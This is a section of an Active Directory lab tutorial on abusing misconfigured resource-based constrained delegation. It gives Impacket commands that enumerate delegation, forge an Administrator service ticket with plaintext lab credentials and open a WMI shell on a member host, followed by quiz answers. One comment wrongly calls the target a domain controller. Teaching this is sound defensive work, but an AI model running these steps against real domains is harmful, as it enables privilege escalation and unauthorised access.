# RBCD Abuse
We've seen how both unconstrained and constrained delegation can be abused in this guide. Misconfigured Resource-Based Constrained Delegation can also be abused. Misconfigurations include allowing a low-privileged user to hold delegation rights to sensitive services, much like what happens in the Constrained Delegation Abuse section.

Let's take a look at which delegation rights are set in the domain, and see if some low-privileged user can delegate tickets to sensitive services:
```
findDelegation.py POLARIS.ALTAIR.LOCAL/skyler.white:Password123 -target-domain polaris.local
```

We see that saul.goodman can delegate tickets to any service hosted by MEMBER. This means that the user can impersonate any other user while accessing this server, through means of the S4U2User and S4U2Proxy extensions. Fortunately for us, we've been able to retrieve this user's credentials from its own user account description attribute that the user forgot to delete. Now, we can use Saul's credentials and access the MEMBER CIFS service as the administrator, for example, compromising the MEMBER machine.

```
#retrieve a ticket for the CIFS service in member as the administrator
getST.py -spn 'CIFS/member' -impersonate Administrator -dc-ip '192.168.122.10' 'polaris.local/saul.goodman:beTTer2caLL2me'
#set the krb5ccname environment var to the new ccache file
export KRB5CCNAME=/home/ubuntu/Administrator.ccache
#use the ticket to access the domain controller through a shell as the administrator
wmiexec.py -k -no-pass polaris.local/administrator@member
#now you've gained access to the MEMBER machine and can execute commands through the CIFS service
whoami
```

!!! question 
    What is the risk of misconfigured RBCD?
??? success "Answer"
     If a low-privileged account is granted delegation rights to a sensitive machine, it can abuse Kerberos extensions (S4U2Self + S4U2Proxy) to impersonate any user, including domain administrators, when authenticating to that machine, and access any service. This effectively lets the attacker gain privileged access without needing the admin’s password or hash.
!!! question
    Which is the most granular type of delegation between Constrained and RBCD?
??? success "Answer"
    Constrained delegation is more granular, since in CD, an administrator determines to which specific services a service can delegate tickets to. In RBCD, a service account defines which other accounts can delegate tickets to it. The service account may host many different services, and RBCD allows delegation to any of these, while CD would only allow delegation to specific services.